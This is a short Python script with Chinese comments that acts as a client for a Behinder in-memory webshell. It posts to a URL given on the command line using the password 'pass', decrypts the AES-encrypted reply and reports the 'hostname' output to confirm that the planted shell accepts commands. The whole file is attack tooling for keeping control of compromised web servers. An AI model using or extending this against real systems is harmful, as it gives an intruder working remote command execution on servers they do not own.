#!/usr/bin/python
# -*- coding:utf-8 -*-
# author:xazlsec

import json
import re
import sys
import hashlib
import base64
import binascii
import requests
from Crypto.Cipher import AES  

def decrypt(key, data):
    key = key.encode('utf-8')
    cipher = AES.new(key, AES.MODE_ECB)  # Create a new AES cipher object

    try:
        decoded_bytes = base64.b64decode(data)  # Try to decode using base64
    except Exception:
        decoded_bytes = base64.b64decode(data.decode('utf-8'))  # Fallback to another decoding method

    return cipher.decrypt(decoded_bytes)  # Decrypt the data
    
def get_key(password):
    hl = hashlib.md5()
    hl.update(password.encode(encoding="utf-8"))
    return hl.hexdigest()[:16]

def get_decode_info(b64data, key):
    deb64jsonstr = decrypt(key, b64data).decode("utf-8")
    datainfo = re.findall("msg\":\"([^\"]+)", deb64jsonstr)[0]
    result = base64.b64decode(datainfo)
    return result.decode("utf-8")

#发生请求，执行命令 hostname 返回结果
def check_mem_shell(shellurl, password):
    qstr = ""
    headers= {"User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
        "Type": "Behinder"
    }
    r = requests.post(shellurl, data=qstr, headers=headers, verify=False)
    if r.status_code == 200:
        key = get_key(password)
        result = get_decode_info(r.text, key)
        return result
    return ""

if __name__=="__main__":
     res = check_mem_shell(sys.argv[1], "pass")
     if res != "":
         print("\n\n内存马地址：", sys.argv[1], "密码：pass")
         print("[+]内存马可正常使用，执行命令 hostname 的结果为：", res)
